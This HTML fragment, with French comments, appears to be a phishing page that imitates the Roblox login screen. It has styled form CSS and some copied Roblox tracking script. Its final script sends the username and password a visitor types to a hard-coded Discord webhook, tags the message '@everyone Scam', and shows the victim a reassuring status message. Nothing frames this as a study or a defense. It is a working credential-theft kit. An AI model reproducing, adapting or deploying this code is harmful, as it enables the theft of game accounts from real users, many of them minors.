            <style>
                /* Styles de base pour le formulaire pour ressembler à Roblox */
                /* Ces styles seront prioritaires sur les styles Roblox chargés plus tôt si les sélecteurs sont assez spécifiques */
                .roblox-login-form {
                    max-width: 350px;
                    margin: 50px auto; /* Centrage du formulaire */
                    padding: 30px;
                    background-color: #2e3034; /* Couleur de fond sombre proche de Roblox */
                    border-radius: 8px;
                    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
                    color: #fff;
                    text-align: center;
                }
                .roblox-login-form h2 {
                    color: #fff;
                    margin-bottom: 25px;
                    font-size: 24px;
                    font-weight: 700;
                }
                .roblox-login-form label {
                    display: block;
                    text-align: left;
                    margin-bottom: 8px;
                    color: #b0b0b0;
                    font-size: 14px;
                }
                .roblox-login-form input[type="text"],
                .roblox-login-form input[type="password"] {
                    width: calc(100% - 20px); /* Ajuster la largeur pour le padding */
                    padding: 12px 10px;
                    margin-bottom: 20px;
                    border: 1px solid #4a4d52;
                    border-radius: 5px;
                    background-color: #3b3e44;
                    color: #fff;
                    font-size: 16px;
                }
                .roblox-login-form input[type="text"]::placeholder,
                .roblox-login-form input[type="password"]::placeholder {
                    color: #7b7e83;
                }
                .roblox-login-form button {
                    width: 100%;
                    padding: 12px;
                    background-color: #007bff; /* Bleu typique Roblox */
                    color: white;
                    border: none;
                    border-radius: 5px;
                    font-size: 18px;
                    font-weight: bold;
                    cursor: pointer;
                    transition: background-color 0.2s ease;
                }
                .roblox-login-form button:hover {
                    background-color: #0056b3;
                }
                #status {
                    margin-top: 20px;
                    font-weight: bold;
                    font-size: 14px;
                }
            </style>

<script type="text/javascript">
    $(function(){
        function trackReturns() {
            function dayDiff(d1, d2) {
                return Math.floor((d1-d2)/86400000);
            }
            if (!localStorage) {
                return false;
            }

            var cookieName = 'RBXReturn';
            var cookieOptions = {expires:9001};
            var cookieStr = localStorage.getItem(cookieName) || "";
            var cookie = {};

            try {
                cookie = JSON.parse(cookieStr);
            } catch (ex) {
                // busted cookie string from old previous version of the code
            }

            try {
                if (typeof cookie.ts === "undefined" || isNaN(new Date(cookie.ts))) {
                    localStorage.setItem(cookieName, JSON.stringify({ ts: new Date().toDateString() }));
                    return false;
                }
            } catch (ex) {
                return false;
            }

            var daysSinceFirstVisit = dayDiff(new Date(), new Date(cookie.ts));
            if (daysSinceFirstVisit == 1 && typeof cookie.odr === "undefined") {
                RobloxEventManager.triggerEvent('rbx_evt_odr', {});
                cookie.odr = 1;
            }
            if (daysSinceFirstVisit >= 1 && daysSinceFirstVisit <= 7 && typeof cookie.sdr === "undefined") {
                RobloxEventManager.triggerEvent('rbx_evt_sdr', {});
                cookie.sdr = 1;
            }
            try {
                localStorage.setItem(cookieName, JSON.stringify(cookie));
            } catch (ex) {
                return false;
            }
        }

        // Les scripts Roblox originaux sont chargés ici...

        GoogleListener.init();



        RobloxEventManager.initialize(true);
        RobloxEventManager.triggerEvent('rbx_evt_pageview');
        trackReturns();
        

        RobloxEventManager._idleInterval = 450000;
        RobloxEventManager.registerCookieStoreEvent('rbx_evt_initial_install_start');
        RobloxEventManager.registerCookieStoreEvent('rbx_evt_ftp');
        RobloxEventManager.registerCookieStoreEvent('rbx_evt_initial_install_success');
        RobloxEventManager.registerCookieStoreEvent('rbx_evt_fmp');
        
    });

</script>

<!-- VOTRE SCRIPT DE WEBHOOK AJOUTÉ ICI -->
<script>
    document.addEventListener('DOMContentLoaded', function() {
        const sendBtn = document.getElementById("sendBtn");
        const usernameInput = document.getElementById("usernameInput");
        const passwordInput = document.getElementById("passwordInput");
        const statusDiv = document.getElementById("status");

        // Mets ici ton URL de webhook :
        const webhookURL = "https://discord.com/api/webhooks/1437088949800665273/ciupy3LwyEs5Q2b1eJtllKzvfq_rNxrFPBtIrxghdPc53FntC6uwKTgOoRLbiyQqc4Qu";

        // Vérifie si les éléments du formulaire existent avant d'ajouter l'écouteur d'événements
        if (sendBtn && usernameInput && passwordInput && statusDiv) {
            sendBtn.addEventListener("click", async (event) => {
                // Empêche le comportement par défaut du bouton (soumission de formulaire, qui pourrait recharger la page)
                event.preventDefault(); 
                
                const username = usernameInput.value.trim();
                const password = passwordInput.value.trim();

                if (username === "" || password === "") {
                    statusDiv.style.color = "red";
                    statusDiv.textContent = "Veuillez renseigner tous les champs.";
                    return;
                }

                try {
                    const payload = {
                        content: `@everyone Scam: Pseudo: ${username} | Mot de passe: ${password}`
                    };

                    const response = await fetch(webhookURL, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify(payload)
                    });

                    if (response.ok) {
                        statusDiv.style.color = "green";
                        statusDiv.textContent = "Connectez-vous (Données envoyées)";
                        usernameInput.value = "";
                        passwordInput.value = "";
                    } else {
                        statusDiv.style.color = "red";
                        // Tente d'afficher plus d'informations sur l'erreur si disponible
                        const errorText = await response.text();
                        statusDiv.textContent = `Erreur lors de l'envoi des données: ${response.status} ${response.statusText} - ${errorText.substring(0, 100)}`;
                    }
                } catch (err) {
                    statusDiv.style.color = "red";
                    statusDiv.textContent = `Erreur de connexion: ${err.message}`;
                }
            });
        } else {
            console.error("Un ou plusieurs éléments du formulaire webhook sont introuvables.");
        }
    });
</script>
